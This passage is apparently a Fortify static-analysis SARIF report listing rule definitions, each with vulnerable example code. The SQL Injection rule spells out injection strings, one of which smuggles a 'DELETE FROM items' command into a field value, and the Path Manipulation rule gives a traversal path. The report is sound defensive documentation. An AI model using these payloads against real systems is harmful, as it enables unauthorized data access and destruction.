{
  "$schema": "https://schemastore.azurewebsites.net/schemas/json/sarif-2.1.0-rtm.5.json",
  "version": "2.1.0",
  "runs": [{
      "tool": {
        "driver": {
          "name": "MicroFocus Fortify SCA",
          "version": "18.20.1071",
          "rules": [
            {
              "id": "823FE039-A7FE-4AAD-B976-9EC53FFE4A59",
              "guid": "823FE039-A7FE-4AAD-B976-9EC53FFE4A59",
              "name": "Input Validation and Representation/Path Manipulation",
              "shortDescription": {
                "text": "Attackers are able to control the file system path argument to {PrimaryCall.name} at {PrimaryLocation.file} line {PrimaryLocation.line}, which allows them to access or modify otherwise protected files.\r\nAllowing user input to control paths used in file system operations could enable an attacker to access or modify otherwise protected system resources."
              },
              "fullDescription": {
                "text": "Path manipulation errors occur when the following two conditions are met:\r\n\r\n1. An attacker is able to specify a path used in an operation on the file system.\r\n\r\n2. By specifying the resource, the attacker gains a capability that would not otherwise be permitted.\r\n\r\nFor example, the program may give the attacker the ability to overwrite the specified file or run with a configuration controlled by the attacker.\r\n\r\nIn this case, the attacker may specify the value that enters the program at <Replace key=\"SourceFunction\" link=\"SourceLocation\"/> in {SourceLocation.file} at line {SourceLocation.line}, and this value is used to access a file system resource at <Replace key=\"SinkFunction\" link=\"SinkLocation\"/> in {SinkLocation.file} at line {SinkLocation.line}.\r\n\r\nEven though the data in this case is a number, it is unvalidated and thus still considered malicious, hence the vulnerability is still reported but with reduced priority values.\r\n\r\n**Example 1:** The following code uses input from an HTTP request to create a file name. The programmer has not considered the possibility that an attacker could provide a file name such as \"`../../tomcat/conf/server.xml`\", which causes the application to delete one of its own configuration files.\r\n\r\n`\nString rName = request.getParameter(\"reportName\");\nFile rFile = new File(\"/usr/local/apfr/reports/\" + rName);\n...\nrFile.delete();\n`\r\n\r\n**Example 2:** The following code uses input from a configuration file to determine which file to open and echo back to the user. If the program runs with adequate privileges and malicious users can change the configuration file, they can use the program to read any file on the system that ends with the extension `.txt`.\r\n\r\n`\nfis = new FileInputStream(cfg.getProperty(\"sub\")+\".txt\");\namt = fis.read(arr);\nout.println(arr);\n`\r\n\r\nSome think that in the mobile world, classic vulnerabilities, such as path manipulation, do not make sense -- why would the user attack themself? However, keep in mind that the essence of mobile platforms is applications that are downloaded from various sources and run alongside each other on the same device. The likelihood of running a piece of malware next to a banking application is high, which necessitates expanding the attack surface of mobile applications to include inter-process communication.\r\n\r\n**Example 3:** The following code adapts Example 1 to the Android platform.\r\n\r\n`\n...\n        String rName = this.getIntent().getExtras().getString(\"reportName\");\n        File rFile = getBaseContext().getFileStreamPath(rName);\n...\n        rFile.delete();\n...\n`"
              },
              "defaultConfiguration": {
                "properties": {
                  "DefaultSeverity": "3.0"
                }
              },
              "relationships": [
                {
                  "target": {
                    "id": "22",
                    "toolComponent": {
                      "name": "CWE",
                      "guid": "25F72D7E-8A92-459D-AD67-64853F788765"
                    }
                  },
                  "kinds": [
                    "relevant"
                  ]
                },
                {
                  "target": {
                    "id": "73",
                    "toolComponent": {
                      "name": "CWE",
                      "guid": "25F72D7E-8A92-459D-AD67-64853F788765"
                    }
                  },
                  "kinds": [
                    "relevant"
                  ]
                }
              ],
              "properties": {
                "Accuracy": "4.0",
                "Impact": "3.0",
                "Probability": "4.0"
              }
            },
            {
              "id": "8452F321-8C5F-4719-A6D6-2CD90FF80F17",
              "guid": "8452F321-8C5F-4719-A6D6-2CD90FF80F17",
              "name": "Security Features/Key Management/Hardcoded Encryption Key",
              "shortDescription": {
                "text": "Hardcoded encryption keys may compromise system security in a way that cannot be easily remedied."
              },
              "fullDescription": {
                "text": "It is never a good idea to hardcode an encryption key because it allows all of the project's developers to view the encryption key, and makes fixing the problem extremely difficult. Once the code is in production, the encryption key cannot be changed without patching the software. If the account that is protected by the encryption key is compromised, the owners of the system will be forced to choose between security and availability.\r\n\r\nIn this case the encryption key is located at <Replace key=\"PrimaryCall.name\" link=\"PrimaryLocation\"/> in {PrimaryLocation.file} at line {PrimaryLocation.line}.\r\n\r\n**Example 1:** The following code uses a hardcoded encryption key:\r\n\r\n`\n...\nvar crypto = require('crypto');\nvar encryptionKey = \"lakdsljkalkjlksdfkl\";\nvar algorithm = 'aes-256-ctr';\nvar cipher = crypto.createCipher(algorithm, encryptionKey);\n...\n`\r\n\r\nAnyone who has access to the code will have access to the encryption key. Once the application has shipped, there is no way to change the encryption key unless the program is patched. An employee with access to this information could use it to break into the system. Even worse, if attackers had access to the executable for the application, they could extract the encryption key value."
              },
              "defaultConfiguration": {
                "properties": {
                  "DefaultSeverity": "3.0"
                }
              },
              "relationships": [
                {
                  "target": {
                    "id": "321",
                    "toolComponent": {
                      "name": "CWE",
                      "guid": "25F72D7E-8A92-459D-AD67-64853F788765"
                    }
                  },
                  "kinds": [
                    "relevant"
                  ]
                }
              ],
              "properties": {
                "Accuracy": "4",
                "Impact": "3.0",
                "Probability": "4.0"
              }
            },
            {
              "id": "2DEE27D8-C41F-48FC-8B40-FA60B403AEAE",
              "guid": "2DEE27D8-C41F-48FC-8B40-FA60B403AEAE",
              "name": "Input Validation and Representation/Resource Injection",
              "shortDescription": {
                "text": "Attackers are able to control the resource identifier argument to {PrimaryCall.name} at {PrimaryLocation.file} line {PrimaryLocation.line}, which could enable them to access or modify otherwise protected system resources.\r\nAllowing user input to control resource identifiers could enable an attacker to access or modify otherwise protected system resources."
              },
              "fullDescription": {
                "text": "A resource injection issue occurs when the following two conditions are met:\r\n\r\n1. An attacker is able to specify the identifier used to access a system resource.\r\n\r\nFor example, an attacker may be able to specify a port number to be used to connect to a network resource.\r\n\r\n2. By specifying the resource, the attacker gains a capability that would not otherwise be permitted.\r\n\r\nFor example, the program may give the attacker the ability to transmit sensitive information to a third-party server.\r\n\r\nIn this case, the attacker may specify the value that enters the program at <Replace key=\"SourceFunction\" link=\"SourceLocation\"/> in {SourceLocation.file} at line {SourceLocation.line}, and this value is used to access a system resource at <Replace key=\"SinkFunction\" link=\"SinkLocation\"/> in {SinkLocation.file} at line {SinkLocation.line}.\r\n\r\nNote: Resource injections involving resources stored on the file system are reported in a separate category named path manipulation. See the path manipulation description for further details of this vulnerability.\r\n\r\n**Example 1:** The following code uses a port number read from an HTTP request to create a socket.\r\n\r\n`\nString remotePort = request.getParameter(\"remotePort\");\n...\nServerSocket srvr = new ServerSocket(remotePort);\nSocket skt = srvr.accept();\n...\n`\r\n\r\nSome think that in the mobile world, classic web application vulnerabilities, such as resource injection, do not make sense -- why would the user attack themself? However, keep in mind that the essence of mobile platforms is applications that are downloaded from various sources and run alongside each other on the same device. The likelihood of running a piece of malware next to a banking application is high, which necessitates expanding the attack surface of mobile applications to include inter-process communication.\r\n\r\n**Example 2:** The following code uses a URL read from an Android intent to load the page in `WebView`.\r\n\r\n`\n...\n\tWebView webview = new WebView(this);\n\tsetContentView(webview);\n        String url = this.getIntent().getExtras().getString(\"url\");\n\twebview.loadUrl(url);\n...\n`\r\n\r\nThe kind of resource affected by user input indicates the kind of content that may be dangerous. For example, data containing special characters like period, slash, and backslash are risky when used in methods that interact with the file system. Similarly, data that contains URLs and URIs is risky for functions that create remote connections."
              },
              "defaultConfiguration": {
                "properties": {
                  "DefaultSeverity": "3.0"
                }
              },
              "relationships": [
                {
                  "target": {
                    "id": "99",
                    "toolComponent": {
                      "name": "CWE",
                      "guid": "25F72D7E-8A92-459D-AD67-64853F788765"
                    }
                  },
                  "kinds": [
                    "relevant"
                  ]
                }
              ],
              "properties": {
                "Accuracy": "4.0",
                "Impact": "2.0",
                "Probability": "3.0"
              }
            },
            {
              "id": "8843F319-8A22-4101-A378-C2B2F2597988",
              "guid": "8843F319-8A22-4101-A378-C2B2F2597988",
              "name": "Errors/Poor Error Handling/Empty Catch Block",
              "shortDescription": {
                "text": "The method {EnclosingFunction.name} in {PrimaryLocation.file} ignores an exception on line {PrimaryLocation.line}, which could cause the program to overlook unexpected states and conditions.\r\nIgnoring an exception can cause the program to overlook unexpected states and conditions."
              },
              "fullDescription": {
                "text": "Just about every serious attack on a software system begins with the violation of a programmer's assumptions. After the attack, the programmer's assumptions seem flimsy and poorly founded, but before an attack many programmers would defend their assumptions well past the end of their lunch break.\r\n\r\nTwo dubious assumptions that are easy to spot in code are \"this method call can never fail\" and \"it doesn't matter if this call fails\". When a programmer ignores an exception, they implicitly state that they are operating under one of these assumptions.\r\n\r\n**Example 1:** The following code excerpt ignores a rarely-thrown exception from `doExchange()`.\r\n\r\n`\ntry {\n  doExchange();\n}\ncatch (RareException e) {\n  // this can never happen\n}\n`\r\n\r\nIf a `RareException` were to ever be thrown, the program would continue to execute as though nothing unusual had occurred. The program records no evidence indicating the special situation, potentially frustrating any later attempt to explain the program's behavior."
              },
              "defaultConfiguration": {
                "level": "note",
                "properties": {
                  "DefaultSeverity": "2.0"
                }
              },
              "relationships": [
                {
                  "target": {
                    "id": "391",
                    "toolComponent": {
                      "name": "CWE",
                      "guid": "25F72D7E-8A92-459D-AD67-64853F788765"
                    }
                  },
                  "kinds": [
                    "relevant"
                  ]
                }
              ],
              "properties": {
                "Accuracy": "5.0",
                "Impact": "1.0",
                "Probability": "1.0"
              }
            },
            {
              "id": "FE4EADF2-7055-4C36-863E-5A01C4A0E1A4",
              "guid": "FE4EADF2-7055-4C36-863E-5A01C4A0E1A4",
              "name": "Encapsulation/System Information Leak",
              "shortDescription": {
                "text": "The function {EnclosingFunction.name} in {PrimaryLocation.file} might reveal system data or debugging information by calling {PrimaryCall.name} on line {PrimaryLocation.line}. The information revealed by {PrimaryCall.name} could help an adversary form a plan of attack.\r\nRevealing system data or debugging information helps an adversary learn about the system and form a plan of attack."
              },
              "fullDescription": {
                "text": "An information leak occurs when system data or debugging information leaves the program through an output stream or logging function.\r\n\r\nIn this case <Replace key=\"PrimaryCall.name\" link=\"PrimaryLocation\"/> is called in {PrimaryLocation.file} at line {PrimaryLocation.line}.\r\n\r\n**Example 1:** The following code prints an exception to the standard error stream:\r\n\r\n`\ntry {\n    ...\n} catch (Exception e) {\n    e.printStackTrace();\n}\n`\r\n\r\nDepending upon the system configuration, this information can be dumped to a console, written to a log file, or exposed to a remote user. For example, with scripting mechanisms it is trivial to redirect output information from &quot;Standard error&quot; or &quot;Standard output&quot; into a file or another program. Alternatively the system that the program runs on could have a remote logging mechanism such as a &quot;syslog&quot; server that will send the logs to a remote device. During development you will have no way of knowing where this information may end up being displayed.\r\n\r\nIn some cases the error message tells the attacker precisely what sort of an attack the system is vulnerable to. For example, a database error message can reveal that the application is vulnerable to a SQL injection attack. Other error messages can reveal more oblique clues about the system. In the example above, the leaked information could imply information about the type of operating system, the applications installed on the system, and the amount of care that the administrators have put into configuring the program.\r\n\r\nHere is another scenario, specific to the mobile world. Most mobile devices now implement a Near-Field Communication (NFC) protocol for quickly sharing information between devices using radio communication. It works by bringing devices to close proximity or simply having them touch each other. Even though the communication range of NFC is limited to just a few centimeters, eavesdropping, data modification and various other types of attacks are possible, since NFC alone does not ensure secure communication.\r\n\r\n**Example 2:** The Android platform provides support for NFC. The following code creates a message that gets pushed to the other device within the range.\n`\n...\npublic static final String TAG = \"NfcActivity\";\nprivate static final String DATA_SPLITTER = \"__:DATA:__\";\nprivate static final String MIME_TYPE = \"application/my.applications.mimetype\";\n...\npublic NdefMessage createNdefMessage(NfcEvent event) {\n    TelephonyManager tm = (TelephonyManager)Context.getSystemService(Context.TELEPHONY_SERVICE);\n    String VERSION = tm.getDeviceSoftwareVersion();\n    String text = TAG + DATA_SPLITTER + VERSION;\n    NdefRecord record = new NdefRecord(NdefRecord.TNF_MIME_MEDIA,\n            MIME_TYPE.getBytes(), new byte[0], text.getBytes());\n    NdefRecord[] records = { record };\n    NdefMessage msg = new NdefMessage(records);\n    return msg;\n}\n...\n`\r\n\r\nNFC Data Exchange Format (NDEF) message contains typed data, a URI, or a custom application payload. If the message contains information about the application, such as its name, MIME type, or device software version, this information could be leaked to an eavesdropper. In the example above, Fortify Static Code Analyzer reports a System Information Leak vulnerability on the return statement."
              },
              "defaultConfiguration": {
                "properties": {
                  "DefaultSeverity": "3.0"
                }
              },
              "relationships": [
                {
                  "target": {
                    "id": "497",
                    "toolComponent": {
                      "name": "CWE",
                      "guid": "25F72D7E-8A92-459D-AD67-64853F788765"
                    }
                  },
                  "kinds": [
                    "relevant"
                  ]
                }
              ],
              "properties": {
                "Accuracy": "4.0",
                "Impact": "2.0",
                "Probability": "1.0"
              }
            },
            {
              "id": "B30AA17C-87EC-42CF-9160-CFDF122CE28E",
              "guid": "B30AA17C-87EC-42CF-9160-CFDF122CE28E",
              "name": "Code Quality/Poor Style/Value Never Read",
              "shortDescription": {
                "text": "The method {EnclosingFunction.name} in {PrimaryLocation.file} never uses the value it assigns to the variable {$var.name$} on line {PrimaryLocation.line}.\r\nThe variable's value is assigned but never used, making it a dead store."
              },
              "fullDescription": {
                "text": "This variable's value is not used. After the assignment, the variable is either assigned another value or goes out of scope.\r\n\r\n**Example:** The following code excerpt assigns to the variable `r` and then overwrites the value without using it.\r\n\r\n`\n  r = getName();\n  r = getNewBuffer(buf);\n`"
              },
              "defaultConfiguration": {
                "properties": {
                  "DefaultSeverity": "2.0"
                }
              },
              "relationships": [
                {
                  "target": {
                    "id": "563",
                    "toolComponent": {
                      "name": "CWE",
                      "guid": "25F72D7E-8A92-459D-AD67-64853F788765"
                    }
                  },
                  "kinds": [
                    "relevant"
                  ]
                }
              ],
              "properties": {
                "Accuracy": "4.0",
                "Impact": "2.0",
                "Probability": "1.0"
              }
            },
            {
              "id": "3E7BCE41-4A79-49FF-8B8B-3F55F1F2DC5E",
              "guid": "3E7BCE41-4A79-49FF-8B8B-3F55F1F2DC5E",
              "name": "Code Quality/Dead Code/Unused Field",
              "shortDescription": {
                "text": "The field {$f.name$} is never used.\r\nThis field is never used."
              },
              "fullDescription": {
                "text": "This field is never accessed, except perhaps by dead code. Dead code is defined as code that is never directly or indirectly executed by a public method. It is likely that the field is simply vestigial, but it is also possible that the unused field points out a bug.\r\n\r\n**Example 1:** The field named `glue` is not used in the following class. The author of the class has accidentally put quotes around the field name, transforming it into a string constant.\r\n\r\n`\npublic class Dead {\r\n\r\n  String glue;\r\n\r\n  public String getGlue() {\n    return \"glue\";\n  }\r\n\r\n}\n`\r\n\r\n**Example 2:** The field named `glue` is used in the following class, but only from a method that is never called.\r\n\r\n`\npublic class Dead {\r\n\r\n  String glue;\r\n\r\n  private String getGlue() {\n    return glue;\n  }\r\n\r\n}\n`"
              },
              "defaultConfiguration": {
                "level": "note",
                "properties": {
                  "DefaultSeverity": "2.0"
                }
              },
              "relationships": [
                {
                  "target": {
                    "id": "561",
                    "toolComponent": {
                      "name": "CWE",
                      "guid": "25F72D7E-8A92-459D-AD67-64853F788765"
                    }
                  },
                  "kinds": [
                    "relevant"
                  ]
                }
              ],
              "properties": {
                "Accuracy": "4.0",
                "Impact": "1.0",
                "Probability": "1.0"
              }
            },
            {
              "id": "FDC3738B-F004-490B-A864-22CD125867DD",
              "guid": "FDC3738B-F004-490B-A864-22CD125867DD",
              "name": "Security Features/Spring Boot Misconfiguration/DevTools Enabled",
              "shortDescription": {
                "text": "The Spring Boot application is configured in developer mode."
              },
              "fullDescription": {
                "text": "The Spring Boot application has DevTools enabled. DevTools include an additional set of tools which can make the application development experience a little more pleasant, but DevTools are not recommended to use on applications in a production environment. As stated in the official Spring Boot documentation: \"Enabling `spring-boot-devtools` on a remote application is a security risk. You should never enable support on a production deployment.\""
              },
              "defaultConfiguration": {
                "properties": {
                  "DefaultSeverity": "2.0"
                }
              },
              "relationships": [
                {
                  "target": {
                    "id": "None",
                    "toolComponent": {
                      "name": "CWE",
                      "guid": "25F72D7E-8A92-459D-AD67-64853F788765"
                    }
                  },
                  "kinds": [
                    "relevant"
                  ]
                }
              ],
              "properties": {
                "Accuracy": "5.0",
                "Impact": "3.0",
                "Probability": "1.0"
              }
            },
            {
              "id": "771E5717-2B4D-64FC-9A63-E16701E24D0D",
              "guid": "771E5717-2B4D-44FC-9A63-E16701E24D0D",
              "name": "Code Quality/Redundant Null Check",
              "shortDescription": {
                "text": "The method {EnclosingFunction.name} in {PrimaryLocation.file} can crash the program by dereferencing a null pointer on line {PrimaryLocation.line}.\r\nThe program can dereference a null pointer, thereby causing a null pointer exception."
              },
              "fullDescription": {
                "text": "Null pointer exceptions usually occur when one or more of the programmer's assumptions is violated. Specifically, dereference-after-check errors occur when a program makes an explicit check for null, but proceeds to dereference the object when it is known to be null. Errors of this type are often the result of a typo or programmer oversight.\r\n\r\nIn this case the variable can be null when it is dereferenced at line {PrimaryLocation.line}, thereby causing a null pointer exception.\r\n\r\nMost null pointer issues result in general software reliability problems, but if attackers can intentionally cause the program to dereference a null pointer, they can use the resulting exception to mount a denial of service attack or to cause the application to reveal debugging information that will be valuable in planning subsequent attacks.\r\n\r\n**Example 1:** In the following code, the programmer confirms that the variable `foo` is `null` and subsequently dereferences it erroneously. If `foo` is `null` when it is checked in the `if` statement, then a null dereference will occur, thereby causing a null pointer exception.\r\n\r\n`\nif (foo == null) {\n\tfoo.setBar(val);\n\t...\n}\n`"
              },
              "defaultConfiguration": {
                "level": "note",
                "properties": {
                  "DefaultSeverity": "3.0"
                }
              },
              "relationships": [
                {
                  "target": {
                    "id": "476",
                    "toolComponent": {
                      "name": "CWE",
                      "guid": "25F72D7E-8A92-459D-AD67-64853F788765"
                    }
                  },
                  "kinds": [
                    "relevant"
                  ]
                }
              ],
              "properties": {
                "Accuracy": "4.0",
                "Impact": "1.0",
                "Probability": "1.0"
              }
            },
            {
              "id": "FF57412F-DD28-44DE-8F4F-0AD39620768C",
              "guid": "FF57412F-DD28-44DE-8F4F-0AD39620768C",
              "name": "Environment/Build Misconfiguration/External Maven Dependency Repository",
              "shortDescription": {
                "text": "This maven build script relies on external sources, which could allow an attacker to insert malicious code into the final product or to take control of the build machine."
              },
              "fullDescription": {
                "text": "Several tools exist within the Java development world to aid in dependency management: both Apache Ant and Apache Maven build systems include functionality specifically designed to help manage dependencies and Apache Ivy is developed explicitly as a dependency manager. Although there are differences in their behavior, these tools share the common functionality that they automatically download external dependencies specified in the build process at build time. This makes it much easier for developer B to build software in the same manner as developer A. Developers just store dependency information in the build file, which means that each developer and build engineer has a consistent way to obtain dependencies, compile the code, and deploy without the dependency management hassles involved in manual dependency management. The following examples illustrate how Ivy, Ant and Maven can be used to manage external dependencies as part of a build process.\r\n\r\nUnder Maven, instead of listing explicit URLs from which to retrieve the dependencies, developers specify the dependency names and versions and Maven relies on its underlying configuration to identify the server(s) from which to retrieve the dependencies. For commonly used components this saves the developer from having to researching dependency locations.\r\n\r\n**Example 1:** The following except from a Maven pom.xml file shows how a developer can specify multiple external dependencies using their name and version:\r\n\r\n`\n&lt;dependencies&gt;\n  &lt;dependency&gt;\n    &lt;groupId&gt;commons-logging&lt;/groupId&gt;\n    &lt;artifactId&gt;commons-logging&lt;/artifactId&gt;\n    &lt;version&gt;1.1&lt;/version&gt;\n  &lt;/dependency&gt;\n  &lt;dependency&gt;\n    &lt;groupId&gt;javax.jms&lt;/groupId&gt;\n    &lt;artifactId&gt;jms&lt;/artifactId&gt;\n    &lt;version&gt;1.1&lt;/version&gt;\n  &lt;/dependency&gt;\n  ...\n&lt;/dependencies&gt;\n`\r\n\r\nTwo distinct types of attack scenarios affect these systems: An attacker could either compromise the server hosting the dependency or compromise the DNS server the build machine uses to redirect requests for hostname of the server hosting the dependency to a machine controlled by the attacker. Both scenarios result in the attacker gaining the ability to inject a malicious version of a dependency into a build running on an otherwise uncompromised machine.\r\n\r\nRegardless of the attack vector used to deliver the Trojan dependency, these scenarios share the common element that the build system blindly accepts the malicious binary and includes it in the build. Because the build system has no recourse for rejecting the malicious binary and existing security mechanisms, such as code review, typically focus on internally-developed code rather than external dependencies, this type of attack has a strong potential to go unnoticed as it spreads through the development environment and potentially into production.\r\n\r\nAlthough there is some risk of a compromised dependency being introduced into a manual build process, by the tendency of automated build systems to retrieve the dependency from an external source each time the build system is run in a new environment greatly increases the window of opportunity for an attacker. An attacker need only compromise the dependency server or the DNS server during one of the many times the dependency is retrieved in order to compromise the machine on which the build is occurring."
              },
              "defaultConfiguration": {
                "properties": {
                  "DefaultSeverity": "2.0"
                }
              },
              "relationships": [
                {
                  "target": {
                    "id": "None",
                    "toolComponent": {
                      "name": "CWE",
                      "guid": "25F72D7E-8A92-459D-AD67-64853F788765"
                    }
                  },
                  "kinds": [
                    "relevant"
                  ]
                }
              ],
              "properties": {
                "Accuracy": "4.0",
                "Impact": "2.0",
                "Probability": "1.0"
              }
            },
            {
              "id": "E789B621-9F69-49C5-A30C-ED6A89F80E31",
              "guid": "E789B621-9F69-49C5-A30C-ED6A89F80E31",
              "name": "Encapsulation/HTML5/Overly Permissive Message Posting Policy",
              "shortDescription": {
                "text": "On line {PrimaryLocation.line} of {PrimaryLocation.file} the program posts a cross-document message with an overly permissive target origin.\r\nThe program posts a cross-document message with an overly permissive target origin.\r\n."
              },
              "fullDescription": {
                "text": "One of the new features of HTML5 is cross-document messaging. The feature allows scripts to post messages to other windows. The corresponding API allows the user to specify the origin of the target window. However, caution should be taken when specifying the target origin because an overly permissive target origin will allow a malicious script to communicate with the victim window in an inappropriate way, leading to spoofing, data theft, relay and other attacks.\r\n\r\n**Example 1:** Below is an example of using a wildcard to programmatically specify the target origin of the message to be sent.\r\n\r\n`\n  o.contentWindow.postMessage(message, '*');\n`\r\n\r\nUsing the `*` as the value of the target origin indicates that the script is sending a message to a window regardless of its origin."
              },
              "defaultConfiguration": {
                "properties": {
                  "DefaultSeverity": "3.0"
                }
              },
              "relationships": [
                {
                  "target": {
                    "id": "None",
                    "toolComponent": {
                      "name": "CWE",
                      "guid": "25F72D7E-8A92-459D-AD67-64853F788765"
                    }
                  },
                  "kinds": [
                    "relevant"
                  ]
                }
              ],
              "properties": {
                "Accuracy": "5.0",
                "Impact": "2.0",
                "Probability": "2.0"
              }
            },
            {
              "id": "73B5DD01-BFBE-4CD5-8759-C432873136FB",
              "guid": "73B5DD01-BFBE-4CD5-8759-C432873136FB",
              "name": "API Abuse/J2EE Bad Practices/Sockets",
              "shortDescription": {
                "text": "The method {EnclosingFunction.name} in {PrimaryLocation.file} calls {PrimaryCall.name}. Socket-based communication in web applications is prone to error.\r\nSocket-based communication in web applications is prone to error."
              },
              "fullDescription": {
                "text": "The J2EE standard permits the use of sockets only for the purpose of communication with legacy systems when no higher-level protocol is available. Authoring your own communication protocol requires wrestling with difficult security issues, including:\r\n\r\n- In-band versus out-of-band signaling\r\n\r\n- Compatibility between protocol versions\r\n\r\n- Channel security\r\n\r\n- Error handling\r\n\r\n- Network constraints (firewalls)\r\n\r\n- Session management\r\n\r\nWithout significant scrutiny by a security expert, chances are good that a custom communication protocol will suffer from security problems.\r\n\r\nMany of the same issues apply to a custom implementation of a standard protocol. While there are usually more resources available that address security concerns related to implementing a standard protocol, these resources are also available to attackers."
              },
              "defaultConfiguration": {
                "properties": {
                  "DefaultSeverity": "2.0"
                }
              },
              "relationships": [
                {
                  "target": {
                    "id": "246",
                    "toolComponent": {
                      "name": "CWE",
                      "guid": "25F72D7E-8A92-459D-AD67-64853F788765"
                    }
                  },
                  "kinds": [
                    "relevant"
                  ]
                }
              ],
              "properties": {
                "Accuracy": "1.0",
                "Impact": "2.0",
                "Probability": "1.0"
              }
            },
            {
              "id": "4B673A45-9AD5-4CBA-945B-11A3702CDF57",
              "guid": "4B673A45-9AD5-4CBA-945B-11A3702CDF57",
              "name": "Input Validation and Representation/SQL Injection",
              "shortDescription": {
                "text": "On line {PrimaryLocation.line} of {PrimaryLocation.file}, the method {EnclosingFunction.name} invokes a SQL query built using input potentially coming from an untrusted source. This call could allow an attacker to modify the statement's meaning or to execute arbitrary SQL commands.\r\nConstructing a dynamic SQL statement with input coming from an untrusted source could allow an attacker to modify the statement's meaning or to execute arbitrary SQL commands."
              },
              "fullDescription": {
                "text": "SQL injection errors occur when:\r\n\r\n1. Data enters a program from an untrusted source.\r\n\r\nIn this case Fortify Static Code Analyzer could not determine that the source of the data is trusted.\r\n\r\n2. The data is used to dynamically construct a SQL query.\r\n\r\nIn this case the data is passed to <Replace key=\"PrimaryCall.name\" link=\"PrimaryLocation\"/> in {PrimaryLocation.file} at line {PrimaryLocation.line}.\r\n\r\n**Example 1:** The following code dynamically constructs and executes a SQL query that searches for items matching a specified name. The query restricts the items displayed to those where the owner matches the user name of the currently-authenticated user.\r\n\r\n`\n...\n\tString userName = ctx.getAuthenticatedUserName();\n\tString itemName = request.getParameter(\"itemName\");\n\tString query = \"SELECT * FROM items WHERE owner = '\"\n\t\t\t\t+ userName + \"' AND itemname = '\"\n\t\t\t\t+ itemName + \"'\";\n\tResultSet rs = stmt.execute(query);\n...\n`\r\n\r\nThe query that this code intends to execute follows:\r\n\r\n`\n\tSELECT * FROM items\n\tWHERE owner = &lt;userName&gt;\n\tAND itemname = &lt;itemName&gt;;\n`\r\n\r\nHowever, because the query is constructed dynamically by concatenating a constant base query string and a user input string, the query only behaves correctly if `itemName` does not contain a single-quote character. If an attacker with the user name `wiley` enters the string \"`name' OR 'a'='a`\" for `itemName`, then the query becomes the following:\r\n\r\n`\n\tSELECT * FROM items\n\tWHERE owner = 'wiley'\n\tAND itemname = 'name' OR 'a'='a';\n`\r\n\r\nThe addition of the `OR 'a'='a'` condition causes the where clause to always evaluate to true, so the query becomes logically equivalent to the much simpler query:\r\n\r\n`\n\tSELECT * FROM items;\n`\r\n\r\nThis simplification of the query allows the attacker to bypass the requirement that the query only return items owned by the authenticated user; the query now returns all entries stored in the `items` table, regardless of their specified owner.\r\n\r\n**Example 2:** This example examines the effects of a different malicious value passed to the query constructed and executed in Example 1. If an attacker with the user name `wiley` enters the string \"`name'; DELETE FROM items; --`\" for `itemName`, then the query becomes the following two queries:\r\n\r\n`\n\tSELECT * FROM items\n\tWHERE owner = 'wiley'\n\tAND itemname = 'name';\r\n\r\n\tDELETE FROM items;\r\n\r\n\t--'\n`\r\n\r\nMany database servers, including Microsoft(R) SQL Server 2000, allow multiple SQL statements separated by semicolons to be executed at once. While this attack string results in an error on Oracle and other database servers that do not allow the batch-execution of statements separated by semicolons, on databases that do allow batch execution, this type of attack allows the attacker to execute arbitrary commands against the database.\r\n\r\nNotice the trailing pair of hyphens (--), which specifies to most database servers that the remainder of the statement is to be treated as a comment and not executed [4]. In this case the comment character serves to remove the trailing single-quote left over from the modified query. On a database where comments are not allowed to be used in this way, the general attack could still be made effective using a trick similar to the one used in Example 1. If an attacker enters the string \"`name'); DELETE FROM items; SELECT * FROM items WHERE 'a'='a`\", the following three valid statements will be created:\r\n\r\n`\n\tSELECT * FROM items\n\tWHERE owner = 'wiley'\n\tAND itemname = 'name';\r\n\r\n\tDELETE FROM items;\r\n\r\n\tSELECT * FROM items WHERE 'a'='a';\n`\r\n\r\nSome think that in the mobile world, classic web application vulnerabilities, such as SQL injection, do not make sense -- why would the user attack themself? However, keep in mind that the essence of mobile platforms is applications that are downloaded from various sources and run alongside each other on the same device. The likelihood of running a piece of malware next to a banking application is high, which necessitates expanding the attack surface of mobile applications to include inter-process communication.\r\n\r\n**Example 3:** The following code adapts Example 1 to the Android platform.\r\n\r\n`\n...\n        PasswordAuthentication pa = authenticator.getPasswordAuthentication();\n        String userName = pa.getUserName();\n        String itemName = this.getIntent().getExtras().getString(\"itemName\");\n        String query = \"SELECT * FROM items WHERE owner = '\"\n                                + userName + \"' AND itemname = '\"\n                                + itemName + \"'\";\n        SQLiteDatabase db = this.openOrCreateDatabase(\"DB\", MODE_PRIVATE, null);\n        Cursor c = db.rawQuery(query, null);\n...\n`\r\n\r\nOne traditional approach to preventing SQL injection attacks is to handle them as an input validation problem and either accept only characters from a whitelist of safe values or identify and escape a blacklist of potentially malicious values. Whitelisting can be a very effective means of enforcing strict input validation rules, but parameterized SQL statements require less maintenance and can offer more guarantees with respect to security. As is almost always the case, blacklisting is riddled with loopholes that make it ineffective at preventing SQL injection attacks. For example, attackers may:\r\n\r\n    - Target fields that are not quoted\n    - Find ways to bypass the need for certain escaped meta-characters\n    - Use stored procedures to hide the injected meta-characters\r\n\r\nManually escaping characters in input to SQL queries can help, but it will not make your application secure from SQL injection attacks.\r\n\r\nAnother solution commonly proposed for dealing with SQL injection attacks is to use stored procedures. Although stored procedures prevent some types of SQL injection attacks, they fail to protect against many others. Stored procedures typically help prevent SQL injection attacks by limiting the types of statements that can be passed to their parameters. However, there are many ways around the limitations and many interesting statements that can still be passed to stored procedures. Again, stored procedures can prevent some exploits, but they will not make your application secure against SQL injection attacks."
              },
              "defaultConfiguration": {
                "level": "note",
                "properties": {
                  "DefaultSeverity": "2.0"
                }
              },
              "relationships": [
                {
                  "target": {
                    "id": "89",
                    "toolComponent": {
                      "name": "CWE",
                      "guid": "25F72D7E-8A92-459D-AD67-64853F788765"
                    }
                  },
                  "kinds": [
                    "relevant"
                  ]
                }
              ],
              "properties": {
                "Accuracy": "1.0",
                "Impact": "1.0",
                "Probability": "5.0"
              }
            },
            {
              "id": "F2BD85B8-504E-4D52-967C-E00A043BAFAD",
              "guid": "F2BD85B8-504E-4D52-967C-E00A043BAFAD",
              "name": "Input Validation and Representation/Denial of Service/StringBuilder",
              "shortDescription": {
                "text": "The call to {PrimaryCall.name} in {PrimaryLocation.file} on line {PrimaryLocation.line} appends untrusted data to a `StringBuilder` instance initialized with the default backing-array size (16). This can cause the JVM to over-consume heap memory space.\r\nAppending untrusted data to `StringBuilder` instance initialized with the default backing-array size can cause the JVM to over-consume heap memory space."
              },
              "fullDescription": {
